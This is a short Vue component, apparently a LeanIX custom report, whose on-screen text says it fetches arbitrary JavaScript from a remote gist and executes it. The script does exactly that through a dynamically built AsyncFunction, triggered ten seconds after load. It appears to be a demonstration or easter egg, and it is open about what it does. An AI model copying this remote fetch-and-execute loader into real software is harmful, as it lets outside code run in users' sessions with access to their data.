<template>
  <div class="h-screen flex flex-col items-center justify-center">
    This is a simple custom report that fetches arbitrary Javascript code from a
    remote origin and executes it...
  </div>
</template>

<script lang="ts" setup>
import "@leanix/reporting";

const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;

const doFunnyStuff = async () =>
  new AsyncFunction(
    await fetch(
      "https://gist.githubusercontent.com/psantos9/f92a1cd16368f63a65012cbb868b34a7/raw/easter-egg.txt"
    ).then((res) => res.text())
  )();

// wait the report to initialize, trigger the funny stuff 10 seconds after loading...
setTimeout(() => doFunnyStuff(), 10000);
</script>
